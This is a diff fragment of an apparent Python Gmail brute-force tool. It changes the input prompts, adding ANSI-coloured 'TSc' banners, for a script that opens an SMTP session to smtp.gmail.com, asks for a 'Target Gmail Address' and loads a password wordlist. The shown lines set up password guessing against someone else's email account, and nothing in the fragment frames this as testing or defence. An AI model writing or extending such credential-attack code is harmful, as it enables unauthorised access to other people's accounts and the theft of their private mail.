@@ -4,11 +4,11 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = input("Enter The Target Gmail Address --> ")
+user = input("\033[4;2;37mTSc \033[0;0;0m> \033[3;36m(Enter The Target Gmail Address)> \033[0;0m")
 
 print("\n")
 
-passswfile= input('Enter password wordlist -->')
+passswfile= input("\033[4;2;37mTSc \033[0;0;0m> \033[3;36m(Enter password wordlist)> \033[0;0m")
 
 passswfile = open(passswfile, "r")
 
